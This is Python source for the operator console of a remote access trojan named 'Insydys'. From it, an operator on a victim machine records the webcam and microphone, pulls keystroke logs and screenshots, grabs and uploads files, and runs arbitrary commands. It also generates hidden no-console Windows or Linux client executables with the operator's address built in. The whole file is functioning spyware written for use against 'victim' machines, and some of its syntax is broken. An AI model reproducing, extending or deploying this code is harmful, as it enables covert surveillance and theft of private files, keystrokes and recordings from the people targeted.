import os
from pyfiglet import Figlet
import sys
import time
import socket
import subprocess as sp
import struct
import cv2
import soundfile as sf
import soundcard as sc
import threading
import subprocess
def vidcap():
   global insydys
   global conn
   conn.send( insydys.encode())
   recordtime=input('Enter duration of video capture(all values taken in seconds)==> ')
   while recordtime=="":
          recordtime=input('Enter duration of video capture(all values taken in seconds)==> ')
          
   conn.send(recordtime.encode())
   print('Retrieving video footage...')
   try:
          vid_inc=conn.recv(4000)
          vid_cap=vid_inc.decode()
          if vid_cap.startswith('could'):
             print(" could not retrieve video footage")
          else:
             size=int(vid_inc)
             print("Video file vidrec.avi is:",size)
             response=input("Retrieve(y/n)?")
             if response[:1]=="y":
                conn.send(response.encode())
                vid_data=conn.recv(size)
                vid_len=len(vid_data)
                vid_file=open("vidrec.avi",'wb')
                vid_file.write(vid_data)
                if vid_len==size:
                       vid_file.close()
                else:
                       while vid_len<size:
                              vid_data=conn.recv(1024)
                              vid_len+=len(vid_data)
                              vid_file.write(vid_data)
                
                vid_file.close()
                
                print("video footage received saved at"+os.getcwd()+"as:vidrec.avi")
                playvid=input('Do u wish to play the video now(y/n): ')
                try:
                     if playvid[:1]=='y'
                            cap = cv2.VideoCapture('vidrec.avi') 
                               
                          
                            if (cap.isOpened()== False):  
                              print("Error opening video  file") 
                               
                       
                            while(cap.isOpened()): 
                                  
                      
                              ret, frame = cap.read() 
                              if ret == True: 
                               
                              
                                cv2.imshow('Frame', frame) 
                               
                               
                                if cv2.waitKey(100) & 0xFF == ord('q'):
                                    break
                              else:
                                 break
                                   
                              
                         
                            cap.release() 
                                   
                               
                            cv2.destroyAllWindows()
                            
                            
                            
                     elif playvid[:1]=='n':
                         print("Exiting video screen")

                        
                except:
                    print('error:could not play video footage!')
             else:
                conn.send(response.encode())
                print("erasing video footage from client...")  

                  
   except:
          print('could not acquire video footage')
           
def audcap():
   global insydys
   global conn
   conn.send( insydys.encode())
   recordtime=input('Enter duration of audio capture(all values taken in seconds)==> ')
   while recordtime=="":
          recordtime=input('Enter duration of audio capture(all values taken in seconds)==> ')
          
   conn.send(recordtime.encode())
   print('Retrieving audio footage...')
   try:
          aud_inc=conn.recv(4000)
          aud_cap=aud_inc.decode()
          if aud_cap.startswith('could'):
             print(" could not retrieve audio footage")
              
          else:
             size=int(aud_inc)
             print("The audio recording is of file size(bytes)",size)
             response=input("Retrieve(y/n)?")
             if response[:1]=="y":
                conn.send(response.encode())
                aud_data=conn.recv(size)
                aud_len=len(aud_data)
                aud_file=open("audrec.wav",'wb')
                aud_file.write(aud_data)
                if aud_len==size:
                       aud_file.close()
                else:
                       while aud_len<size:
                              aud_data=conn.recv(1024)
                              aud_len+=len(aud_data)
                              aud_file.write(aud_data)
                print("audio footage  received")
                aud_file.close()
                print("video footage received saved at"+os.getcwd()+" as :audrec.wav")
                playaud=input('Do u wish to play the audio now(y/n): ')
                try:
                       if playaud[:1]=='y' or 'Y':
                              default_speaker = sc.default_speaker()
                              samples, samplerate = sf.read('audrec.wav')
                              default_speaker.play(samples, samplerate=samplerate)
                       elif playaud[:1]=='n' or 'N':
                              print("releasing speakers")
                               
                       else:
                              print("releasing speakers")
                               
                except:
                       print('error:could not play video footage!')
             else:
                conn.send(response.encode())
                print("Erasing audio recording on client machine...")

                     
   except:
             print('could not acquire audio footage')
              

def grab():
    global insydys
    global conn
    try:
        
          conn.send(insydys.encode())
          filename=input("[*]File to grab: ")
          while filename=="":
                 filename=input("[*]File to grab: ")      
          conn.send(filename.encode())                     
          file_inc=conn.recv(4000)
          file_cap=file_inc.decode()
          if file_cap.startswith('Directory'):
            check=conn.recv(4000)
            checked=check.decode()
            size=int(checked)
            print("The file *",filename," *is a directory will be converted to a zip file of size(bytes):",size)
            response=input("Retrieve(y/n)?")
            if response[:1]=="y":
               conn.send(response.encode())
               file_data=conn.recv(size)
               full_data=len(file_data)
               file=open(filename+'.zip','wb')
               file.write(file_data)
               if full_data==size:
                      file.close()
                      print("file received")
                       
               else:
                      while full_data<size:
                             file_data=conn.recv(1024)
                             full_data+=len(file_data)
                             file.write(file_data)
               file.close()
               print("File received")
            else:
               conn.send(response.encode())
               print("releasing file...")
             

          elif file_cap.startswith('file'):
            check=conn.recv(4000)
            checked=check.decode()
            size=int(checked)
            print("The file "+filename+"is of size(bytes):",size)
            response=input("Retrieve(y/n)?")
            if response[:1]=="y":
               conn.send(response.encode())
               file_data=conn.recv(size)
               full_data=len(file_data)
               file=open(filename,'wb')
               file.write(file_data)
               if full_data==size:
                      file.close()
                       
               else:
                      while full_data<size:
                             file_data=conn.recv(1024)
                             full_data+=len(file_data)
                             file.write(file_data)
               file.close()
               print("File received")
            else:
               conn.send(response.encode())
               print("releasing file...")
          elif file_cap.startswith('File'):
             print("File not found")
    except:
      error=conn.recv(1024)
      print(error)

       
def screenshot():
    global insydys
    global conn
    conn.send(insydys.encode())
    try:
          scrn_inc=conn.recv(40000)
          scrn_cap=scrn_inc.decode()
          if scrn_cap.startswith('Image'):
             print(" not found")
              
          else:
             size=int(scrn_inc)
             print("screenshot.jpg",size)
             screen_data=conn.recv(size)
             screen_len=len(screen_data)
             screen_file=open("screenshot.jpg",'wb')
             screen_file.write(screen_data)
             if screen_len==size:
                    screen_file.close()
                     
             else:
                    while screen_len<size:
                           screen_data=conn.recv(1024)
                           screen_len+=len(screen_data)
                           screen_file.write(screen_data)
             print("screenshot received")
             screen_file.close()
             print("screenshot saved at ",os.getcwd() +"as :screenshot.jpg")
             view_image=input("View screenshot now(y/n)?")
             if view_image=="y":
                image = cv2.imread('screenshot.jpg')
                cv2.imshow('Screenshot',image)
                if cv2.waitKey(100) & 0xFF == ord('q'):
                   cv2.destroyAllWindows()
                
                
                
                    
             elif view_image=="n":
                print("unloading image frame")
             else:
                print(" ")
                
              
    except:
          print('could not acquire screenshot')
def Generate_exe():
   global host
   global port
   global ports
   ports=str(port)
   print("****EXE GENERATION STAGE****")
   OS=input("Generate executable for(Windows/Linux)?")
   if OS[:7]=="Windows" or OS[:7]=="windows":
      global windows_file
      windows_file=input("Enter file name for executable:")
      windows_compiler()
   elif OS[:6]=="Linux" or  OS[:6]=="linux":
      global linux_file
      linux_file=input("Enter file name for executable:")
      linux_compiler()
   else:
      print("Please check your selection")
      return Generate_exe()
      
def windows_compiler():
   global host
   global ports
   global windows_file
   file = open("insydyscli.py", "r")
   text = file.read()
   file.close()
   file = open("insydyscli.py", "w")
   file.write(text.replace('0.0.0.0',host))
   file.close()
   file = open("insydyscli.py", "r")
   text = file.read()
   file.close()
   file = open("insydyscli.py", "w")
   file.write(text.replace('0000',ports))
   file.close()
   file_path=input("Enter path for output file:")
   print("Generating exe please wait...")
   cc="wine pyinstaller.exe --clean --onefile --noconsole insydyscli.py --distpath "+file_path+" --name "
   sh=sp.Popen(cc+windows_file,shell=True,
                              stdout=sp.PIPE,
                              stderr=sp.PIPE,
                              stdin=sp.PIPE)


   print("file generated saved at",os.getcwd(),"/dist/",windows_file)
   file = open("insydyscli.py", "r")
   text = file.read()
   file.close()
   file = open("insydyscli.py", "w")
   file.write(text.replace(host,'0.0.0.0'))
   file.close()
   file = open("insydyscli.py", "r")
   text = file.read()
   file.close()
   file = open("insydyscli.py", "w")
   file.write(text.replace(ports,'0000'))
   file.close()
def linux_compiler():
   global linux_file
   global host
   global ports
   file = open("insydercli.py", "r")
   text = file.read()
   file.close()
   file = open("insydercli.py", "w")
   file.write(text.replace('0.0.0.0',host))
   file.close()
   file = open("insydercli.py", "r")
   text = file.read()
   file.close()
   file = open("insydercli.py", "w")
   file.write(text.replace('0000',ports))
   file.close()
   file_path2=input("Enter path for output file:")
   print("Generating exe please wait...")
   subprocess.call(["pyinstaller","--onefile","--clean","--noconsole","insydercli.py","--distpath",file_path2,"--name",linux_file])
   print("file generated saved at",file_path2)
   file = open("insydercli.py", "r")
   text = file.read()
   file.close()
   file = open("insydercli.py", "w")
   file.write(text.replace(host,'0.0.0.0.'))
   file = open("insydercli.py", "r")
   text = file.read()
   file.close()
   file = open("insydercli.py", "w")
   file.write(text.replace(ports,'0000'))
   file.close()
def upload():
   global insydys
   global conn
   conn.send( insydys.encode())
   file=input("[*]File/path to file for upload: ")
   while file=="":
          file=input("[*]File/path to file for upload: ")
   conn.send(file.encode())
   try:
      file_size=os.path.getsize(file)
      size=str(file_size)
      conn.send(size.encode())
      print("file size %f"%file_size)
      file_=open(file,'rb')
      file_data=file_.read(file_size)
      conn.send(file_data)
      file_.close()
      print("uploading file")
      confirm=conn.recv(2048)
      confirmed=confirm.decode()
      if confirmed.startswith('file'):
                 print("file uploaded successfully")
                  
      elif confirmed.startswith('could'):
                 print('file upload failed')
                  
   except:
      Hostfail="failed:Host machine could not upload the file it may not exist or path is wrong"
      print(Hostfail)
      conn.send(Hostfail.encode())
       


def cd():
   global insydys
   global conn
   insydys= insydys.encode()
   conn.send( insydys)
   try:
         
          file_Path=input("[*]Enter file path/Drive letter(eg.c:)"+"\n"+"to go up a directory use(..)"+"\n"+"=>")
          conn.send(file_Path.encode())
          drctry=conn.recv(2000)
          dictry=drctry.decode('utf-8')
          if dictry.startswith("could"):
                 print(dictry)
                  
          elif dictry=="":
                 print("Empty output for directory")
                  
          else:
                 print(dictry)
                  
   except:
          print("")
           
def keylog():
   global insydys
   global conn
   insydys= insydys.encode()
   conn.send( insydys)
   try:
         keysize=conn.recv(1024)
         sized=keysize.decode()
         if sized.startswith('could'):
            print(sized)
         else:
            act_size=int(sized)
            print(act_size)
            output=conn.recv(act_size)
            file=open('keylog.txt','wb') 
            full_data=len(output)
            file.write(output)
                           
            if full_data==act_size:
                   file.close()
            else:
                   while full_data<act_size:
                          output=conn.recv(1024)
                          full_data+=len(output)
                          file.write(output)
            file.close()
            com_out=open('keylog.txt','r')
            contents=com_out.read()
            com_out.close()
            print(contents)
            print("keylogs saved at"+os.getcwd()+"as:keylog.txt")
                   
   except:
         print("could not acquire victim keystrokes")


   
   
def sysinfo():
    global insydys
    global conn
    insydys= insydys.encode()
    conn.send(insydys)
    try:
       p=conn.recv(1024)
       pr=p.decode()
       print(pr)

                  
                   
    except:
           print("could not acquire victim system information")
def server():
   global host
   global port
   print("******Server initialisation stage******")
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.bind((host,port))
   print('[=]server binded successfully')
   s.listen(1)
   print("[=]server running and listening to incoming connnections")
   global conn
   conn,addr=s.accept()
   print("[=]server connected to",addr)
   print("****options****","\n","vidcap->get video footage of webcams recording","\n",
                    "audcap->get audio recording from victim machine microphone","\n",
                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
                    "sysinfo->acquire victim machine system information","\n",
                    "help->displays this information")
   
   while 1:
       while True:
           global insydys
           insydys=input(str('insydys>: '))
           while insydys=="":
               insydys=input(str('insydys>: '))
           if insydys=="close":
               conn.send(insydys.encode())
               s.close()
               conn.close()
               sys.exit()
           elif insydys[:7]=="sysinfo":
               sysinfo()
               break
           elif insydys[:2]=="cd":
               cd()
               break
           elif insydys[:4]=="grab":
               grab()
               break
           elif insydys[:6]=="vidcap":
               vidcap()
               break
           elif insydys[:6]=="keylog":
               keylog()
               break
           elif insydys[:6]=="audcap":
               audcap()
               break
           elif insydys[:10]=="screenshot":
               screenshot()
               break
           elif insydys[:7]=="options":
               print("****options****","\n","vidcap->get video footage of webcams recording","\n",
                    "audcap->get audio recording from victim machine microphone","\n",
                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
                    "sysinfo->acquire victim machine system information","\n",
                    "help->displays this information")

               break
           elif insydys[:4]=="help":
               print("****options****","\n","vidcap->get video footage of webcams recording","\n",
                    "audcap->get audio recording from victim machine microphone","\n",
                    "keylog->get keystrokes captured","\n","grab->acquire files and folders from victim machine","\n",
                    "upload->uploads file to victim machine","\n","screenshot->get a screenshot of victim machine","\n",
                    "sysinfo->acquire victim machine system information","\n",
                    "help->displays this information")

               break
           elif insydys[:6]=="upload":
               upload()
               break
           
           else:
                insydys= insydys.encode()
                conn.send( insydys)
                try:
                       
                       size_d=conn.recv(1024)
                       sized=size_d.decode()
                       if sized.startswith('unknown'):
                              print("error while handling command/command has no static output")
                              
                       else :
                              print(sized)
                              act_size=int(sized)
                              print(act_size)
                              output=conn.recv(act_size)
                              file=open('_.txt','wb') 
                              full_data=len(output)
                              file.write(output)
                                                                  
                              if full_data==act_size:
                                     file.close()
                              else:
                                     while full_data<act_size:
                                            output=conn.recv(1024)
                                            full_data+=len(output)
                                            file.write(output)
                              file.close()
                              com_out=open('_.txt','r')
                              contents=com_out.read()
                              com_out.close()
                              print(contents)
                             
                except:
                       print("Value error data  received was invalid")


   
def main():
   custom_fig = Figlet(font='graffiti')
   print(custom_fig.renderText('Insydys'))
   global host
   global port
   start_server=input("(1)Start insydys session with entered host and port"
                      +"\n"+"(2)Generate executable file and quit"+"\n"+
                      "(3)Generate executable and start insydys session"+"\n"+":")
   host=input("Enter connection I.P address:")
   while host=="":
      host=input("Enter connection I.P address:")
   port=int(input("Enter connection port:"))
   while port=="":
      port=int(input("Enter connection port:"))
   if start_server[:1]=="1":
      server()
   elif start_server[:1]=="2":
      Generate_exe()
   elif start_server[:1]=="3":
      Generate_exe()
      server()
   else:
      print("No selection made exiting")
      sys.exit()
if __name__=="__main__":
       main()           
        
   

    

    
    
    
    
    

    
    
    
